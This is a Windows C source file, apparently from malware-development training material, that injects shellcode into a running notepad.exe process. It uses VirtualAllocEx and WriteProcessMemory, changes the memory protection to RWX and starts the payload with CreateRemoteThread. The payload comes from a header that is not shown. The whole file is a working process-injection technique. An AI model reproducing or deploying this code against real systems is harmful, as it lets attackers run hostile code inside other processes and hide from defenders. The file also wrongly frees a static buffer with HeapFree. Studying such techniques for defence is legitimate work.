#include <Windows.h>
#include <stdio.h>
#include <Tlhelp32.h>

#include "shellcodes.h"


// Based on:
//   Process Injection - Shellcode Injection
//   https://maldevacademy.com/modules/29
//   k@NUL0x4C | @mrd0x : MalDevAcademy


// Note: this seems to crash notepad, but shellcode is being executed


// Find the process we inject to based on its name
BOOL GetRemoteProcessHandle(LPWSTR processName, DWORD* processIdPtr, HANDLE* hProcess) {
	HANDLE			hSnapShot = NULL;
	PROCESSENTRY32	Proc;
	Proc.dwSize = sizeof(PROCESSENTRY32);

	hSnapShot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);
	if (hSnapShot == INVALID_HANDLE_VALUE) {
		printf("[!] CreateToolhelp32Snapshot Failed With Error : %d \n", GetLastError());
		goto _EndOfFunction;
	}
	if (!Process32First(hSnapShot, &Proc)) {
		printf("[!] Process32First Failed With Error : %d \n", GetLastError());
		goto _EndOfFunction;
	}

	do {
		// Convert to lowercase
		WCHAR LowerName[MAX_PATH * 2];
		if (Proc.szExeFile) {
			DWORD	dwSize = lstrlenW(Proc.szExeFile);
			DWORD   i = 0;
			RtlSecureZeroMemory(LowerName, MAX_PATH * 2);
			if (dwSize < MAX_PATH * 2) {
				for (; i < dwSize; i++)
					LowerName[i] = (WCHAR)tolower(Proc.szExeFile[i]);
				LowerName[i++] = '\0';
			}
		}

		if (wcscmp(LowerName, processName) == 0) {
			*processIdPtr = Proc.th32ProcessID;
			*hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, Proc.th32ProcessID);
			if (*hProcess == NULL)
				printf("[!] OpenProcess Failed With Error : %d \n", GetLastError());
			break;
		}
	} while (Process32Next(hSnapShot, &Proc));

_EndOfFunction:
	if (hSnapShot != NULL)
		CloseHandle(hSnapShot);
	if (*processIdPtr == NULL || *hProcess == NULL)
		return FALSE;
	return TRUE;
}


BOOL InjectShellcodeToRemoteProcess(HANDLE hProcess, PBYTE payload, SIZE_T payloadSize) {
	PVOID	shellcodeAddr = NULL;
	SIZE_T	numberOfBytesWritten = NULL;
	DWORD	oldProtection = NULL;

	// ALLOC
	shellcodeAddr = VirtualAllocEx(hProcess, NULL, payloadSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	if (shellcodeAddr == NULL) {
		printf("[!] VirtualAllocEx Failed With Error : %d \n", GetLastError());
		return FALSE;
	}

	// COPY
	if (!WriteProcessMemory(hProcess, shellcodeAddr, payload, payloadSize, &numberOfBytesWritten) || numberOfBytesWritten != payloadSize) {
		printf("[!] WriteProcessMemory Failed With Error : %d \n", GetLastError());
		return FALSE;
	}
	
	// RW->RWX
	if (!VirtualProtectEx(hProcess, shellcodeAddr, payloadSize, PAGE_EXECUTE_READWRITE, &oldProtection)) {
		printf("[!] VirtualProtectEx Failed With Error : %d \n", GetLastError());
		return FALSE;
	}

	// NEW THREAD
	if (CreateRemoteThread(hProcess, NULL, NULL, (LPTHREAD_START_ROUTINE)shellcodeAddr, NULL, NULL, NULL) == NULL) {
		printf("[!] CreateRemoteThread Failed With Error : %d \n", GetLastError());
		return FALSE;
	}

	return TRUE;
}


int example_2() {
	HANDLE		hProcess = NULL;
	DWORD		processId = NULL;

	PBYTE   payload = (PBYTE)shellcode;
	SIZE_T  payloadSize = sizeof(shellcode);
	wchar_t* processName = (wchar_t*) L"notepad.exe";

	// Start process

	// Getting a handle to the process
	if (!GetRemoteProcessHandle(processName, &processId, &hProcess)) {
		printf("[!] Process is Not Found \n");
		return -1;
	}
	printf("[i] Found Target Process Pid: %d \n", processId);

	// Injecting the shellcode
	if (!InjectShellcodeToRemoteProcess(hProcess, payload, payloadSize)) {
		return -1;
	}

	// Finished
	HeapFree(GetProcessHeap(), 0, payload);
	CloseHandle(hProcess);
	return 0;
}

